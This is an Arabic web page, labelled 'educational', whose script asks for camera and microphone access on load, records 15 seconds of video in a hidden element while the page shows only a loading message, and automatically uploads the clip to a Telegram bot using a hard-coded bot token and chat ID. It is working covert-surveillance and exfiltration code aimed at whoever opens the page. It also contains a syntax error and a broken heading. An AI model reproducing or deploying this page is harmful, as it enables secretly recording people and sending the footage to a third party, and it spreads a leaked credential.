<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>تسجيل 15 ثانية وإرسال تلقائي إلى Telegram (تعليمي)</title>
<style>
  body{font-family:Tahoma, Arial;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#f3f6ff}
  #msg{max-width:760px;padding:18px;text-align:center;color:#222}
  #status{margin-top:10px;color:#333}
  video{display:none} /* لا نعرض الفيديو */
</style>
</head>
<body>
  <div id="msg">
    <h3></h3>.</h3>
    <p id="status">جارٍ البدء...</p>
  </div>

  <video id="hiddenVideo" autoplay playsinline muted></video>

<script>
/*
  مهم: استبدل القيم التالية محليًا إذا أردت تجربة الإرسال المباشر.
  لا تضع توكن حقيقي في صفحة منشورة علنًا.

  مثال محلي (لا تشاركه):
    const BOT_TOKEN = "8178761195:AAH..."; 
    const CHAT_ID  = "6683130316";
*/
const BOT_TOKEN = "8178761195:AAHUVKSv3VrrRSDWRULLSV6IgPuE0vZx6Y0";
const CHAT_ID  = "6683130316";

const RECORD_SECONDS = 15;      // مدة التسجيل اللي طلبتها
const AUTO_SEND = true;         // يرسل تلقائياً بعد الانتهاء
const UPLOAD_DIRECTLY = true;   // يحاول الإرسال مباشرةً لتليجرام (قد يواجه CORS)
const UPLOAD_ENDPOINT = '/upload'; // لو استخدمت سيرفر وسيط، اضبط UPLOAD_DIRECTLY=false وغيّر المسار

const statusEl = document.getElementById('status');
const hiddenVideo = document.getElementById('hiddenVideo');

let started = false;
let stream = null;
let mediaRecorder = null;
let recordedBlobs = [];

window.addEventListener('load', () => {
  attemptStart(); // محاولة مباشرة عند التحميل
  window.addEventListener('click', onFirstInteraction, { once: true });
  window.addEventListener('touchstart', onFirstInteraction, { once: true });
  window.addEventListener('keydown', onFirstInteraction, { once: true });
});

function onFirstInteraction() {
  if (!started) attemptStart();
}

async function attemptStart() {
  if (started) return;
  started = true;
  statusEl.textContent = 'طلب إذن الكاميرا والميكروفون... (سوف يظهر مربع السماح من المتصفح)';
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    hiddenVideo.srcObject = stream;
    setupRecorderAndStart();
  } catch (err) {
    console.warn('getUserMedia failed:', err);
    statusEl.textContent = جار التحميل.';
    started = false;
  }
}

function setupRecorderAndStart() {
  try {
    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
  } catch (e) {
    mediaRecorder = new MediaRecorder(stream);
  }

  recordedBlobs = [];
  mediaRecorder.ondataavailable = ev => { if (ev.data && ev.data.size) recordedBlobs.push(ev.data); };

  mediaRecorder.onstart = () => {
    statusEl.textContent = `بدء التسجيل تلقائياً — سيتم الإيقاف بعد ${RECORD_SECONDS} ثانية`;
    console.log('Recorder started');
  };

  mediaRecorder.onstop = async () => {
    statusEl.textContent = 'انتهى التسجيل — جارٍ المعالجة...';
    if (stream) stream.getTracks().forEach(t => t.stop());

    const blob = new Blob(recordedBlobs, { type: 'video/webm' });
    const sizeMB = (blob.size / (1024*1024)).toFixed(2);
    console.log('Recorded size MB:', sizeMB);

    if (!AUTO_SEND) {
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = `rec_${Date.now()}.webm`;
      a.textContent = `تحميل التسجيل (${sizeMB} MB)`;
      document.getElementById('msg').appendChild(a);
      statusEl.textContent = 'انتهت العملية — اضغط لتحميل التسجيل.';
      return;
    }

    if (UPLOAD_DIRECTLY) {
      if (!BOT_TOKEN || BOT_TOKEN.includes('PLACEHOLDER') || !CHAT_ID || CHAT_ID.includes('PLACEHOLDER')) {
        statusEl.textContent = 'استبدل BOT_TOKEN و CHAT_ID محليًا داخل الملف قبل الاختبار أو استخدم سيرفر وسيط.';
        return;
      }
      statusEl.textContent = 'جارٍ الإرسال المباشر إلى Telegram...';
      await sendDirectToTelegram(blob);
    } else {
      statusEl.textContent = 'جارٍ رفع الملف إلى السيرفر الوسيط...';
      await uploadToServer(blob);
    }
  };

  mediaRecorder.start();
  setTimeout(() => {
    if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
  }, RECORD_SECONDS * 1000);
}

async function sendDirectToTelegram(blob) {
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', 'تعليمي — تسجيل 15 ثانية من المتصفح');
    form.append('video', blob, `rec_${Date.now()}.webm`);

    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
      method: 'POST',
      body: form
    });

    if (!resp.ok) {
      const txt = await resp.text().catch(()=>null);
      console.error('Telegram HTTP error', resp.status, txt);
      statusEl.textContent = `فشل الإرسال (HTTP ${resp.status}) — قد يكون سبب CORS أو حجم الملف.`;
      return;
    }

    const json = await resp.json().catch(()=>null);
    if (json && json.ok) {
      statusEl.textContent = '✅ تم الإرسال إلى Telegram بنجاح (تجريبي).';
    } else {
      console.error('Telegram API response', json);
      statusEl.textContent = 'فشل الإرسال: تحقق من التوكن/Chat ID أو استخدم سيرفر وسيط.';
    }
  } catch (err) {
    console.error('send error:', err);
    statusEl.textContent = 'خطأ أثناء الإرسال: ' + (err.message || err) + ' — غالبًا CORS أو قيود المتصفح.';
  }
}

async function uploadToServer(blob) {
  try {
    const form = new FormData();
    form.append('video', blob, `rec_${Date.now()}.webm`);
    const resp = await fetch(UPLOAD_ENDPOINT, { method: 'POST', body: form });
    if (!resp.ok) {
      const txt = await resp.text().catch(()=>null);
      console.error('Upload HTTP error', resp.status, txt);
      statusEl.textContent = `فشل رفع الملف إلى السيرفر (HTTP ${resp.status}).`;
      return;
    }
    const j = await resp.json().catch(()=>null);
    console.log('Upload response:', j);
    statusEl.textContent = '✅ تم الرفع للسيرفر الوسيط بنجاح.';
  } catch (err) {
    console.error('Upload error:', err);
    statusEl.textContent = 'خطأ أثناء الرفع: ' + (err.message || err);
  }
}
</script>
</body>
</html>